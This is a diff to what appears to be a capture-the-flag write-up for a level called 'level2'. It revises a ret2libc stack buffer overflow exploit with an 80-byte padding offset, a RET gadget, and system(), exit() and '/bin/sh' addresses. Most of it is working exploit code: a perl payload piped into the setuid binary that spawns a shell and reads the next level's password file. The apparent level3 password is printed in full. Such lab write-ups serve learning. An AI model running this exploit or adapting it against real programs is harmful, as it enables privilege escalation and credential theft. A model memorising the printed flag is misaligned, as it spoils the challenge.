@@ -44,14 +44,16 @@ The RET gadget trick:
 4. The RET instruction pops the next value from stack into EIP
 5. That next value is system() - now called without hitting the check again!
 
-**Payload (80 bytes):**
+**Payload (96 bytes total):**
 ```
-[76 bytes] "A" * 76
+[80 bytes] "A" * 80                    (CRITICAL: 80 bytes, not 76!)
 [4 bytes]  RET gadget address: 0x0804853e
 [4 bytes]  system() address:   0xb7e6b060
 [4 bytes]  exit() address:     0xb7e5ebe0
 [4 bytes]  "/bin/sh" pointer:  0xb7f8cc58
 ```
+
+**Key Discovery:** The vulnerable code reads the return address from `buffer + 80`, not `buffer + 76`. The buffer is 76 bytes, but there are 4 additional bytes of padding/alignment before the actual return address on the stack.
 
 ### Step 5: Find Libc Addresses
 
@@ -77,12 +79,17 @@ Typical addresses (if ASLR unchanged):
 
 ```bash
 ssh level2@<VM_IP> -p 4242
+cd /home/user/level2
 
-# Create payload
-perl -e 'print "A" x 76 . "\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7"' > /tmp/payload
+# IMPORTANT: The newline after the payload is CRITICAL!
+# Without it, gets() will read the echo commands as part of the buffer
+(perl -e 'print "A" x 80 . "\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7\n"'; echo "cat /home/user/level3/.pass"; echo "exit") | ./level2
+```
 
-# Run exploit
-(cat /tmp/payload; echo "whoami"; echo "id"; echo "cat /home/user/level3/.pass"; echo "exit") | ./level2
+Expected output:
+```
+AAAA...AAAA>... (buffer echoed by puts())
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 (Level3 password)
 ```
 
 You should see:
@@ -140,8 +147,38 @@ uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) ...
 ### Key Constraints
 - ASLR: Disabled (addresses are fixed)
 - NX: Disabled (stack executable, though we don't execute code on stack in this solution)
-- Only need 76 bytes to reach the return address
+- Need 80 bytes (not 76!) to reach the return address - critical offset detail
 - The RET gadget is at a fixed address in the binary: 0x0804853e
+
+### Critical Implementation Details
+
+**1. Buffer Offset (80 bytes, not 76)**
+- The vulnerable code does: `return_address = *(unsigned int*)(buffer + 80)`
+- Even though the buffer is declared as 76 bytes, there's 4 bytes of padding on the stack
+- Using only 76 bytes of padding will overwrite the wrong memory location
+- **Must use 80 bytes** of padding for the exploit to work
+
+**2. Newline After Payload**
+- `gets()` reads input until it encounters a newline or EOF
+- Without the newline, gets() continues reading echo commands as part of the buffer
+- This corrupts the stack and causes a segmentation fault
+- **The `\n` at the end of the payload is essential**
+
+**3. Payload Structure Over Pipe**
+- When piping data to a binary, binary payloads don't include newlines naturally
+- Must explicitly add `\n` in the perl command: `"\x...\xf8\xb7\n"`
+- Shell commands on separate lines (via echo) are then available for the spawned shell
+
+**Example that FAILS:**
+```bash
+perl -e 'print "A" x 76 . "\x3e\x85\x04\x08..."' | ./level2
+echo "cat /home/user/level3/.pass" | ./level2  # Never reaches the shell!
+```
+
+**Example that WORKS:**
+```bash
+(perl -e 'print "A" x 80 . "\x3e\x85\x04\x08...\n"'; echo "commands") | ./level2
+```
 
 ### Verification
 
